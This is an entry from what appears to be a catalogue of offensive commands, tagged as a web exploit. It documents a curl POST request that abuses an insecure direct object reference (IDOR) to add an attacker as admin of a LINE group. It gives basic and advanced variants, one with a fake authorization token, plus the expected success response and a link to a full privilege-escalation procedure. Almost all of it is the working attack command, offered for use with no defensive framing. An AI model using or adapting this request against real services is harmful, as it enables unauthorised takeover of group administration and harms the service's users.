---
data: >-
  curl -X POST 'https://example.line.endpoint/admin/add' -H 'Content-Type:
  application/json' -d '{"group_id": "extracted_id", "user_id": "attacker_id",
  "role": "admin"}'
tags:
  - web
  - exploit
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: bac459ed-4f26-4654-9705-b6e43f133b1f
created_at: '2025-12-11T06:10:22.392Z'
updated_at: '2025-12-11T06:10:22.392Z'
verified: false
validated: true
submitted: true
---
# curl-craft-admin-request

## Command

```bash
curl -X POST 'https://example.line.endpoint/admin/add' -H 'Content-Type: application/json' -d '{"group_id": "extracted_id", "user_id": "attacker_id", "role": "admin"}'
```

## Description

This command crafts a POST request to exploit IDOR by adding admin rights in LINE accounts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `URL` | Admin endpoint | Yes |
| `-H 'Content-Type'` | Sets JSON type | Yes |
| `-d` | JSON payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://example.line.endpoint/admin/add' -H 'Content-Type: application/json' -d '{"group_id": "abc123", "user_id": "hacker", "role": "admin"}'
```

### Advanced Usage

```bash
curl -X POST 'https://example.line.endpoint/admin/add' -H 'Content-Type: application/json' -H 'Authorization: fake_token' -d '{"group_id": "abc123", "user_id": "hacker", "role": "admin"}'
```

## Expected Output

Success response indicating admin addition, e.g., {"status": "ok"}

## Related

- [[commands/curl-extract-group-id]]
- [[procedures/Exploit-IDOR-to-Gain-Admin-Privileges]]
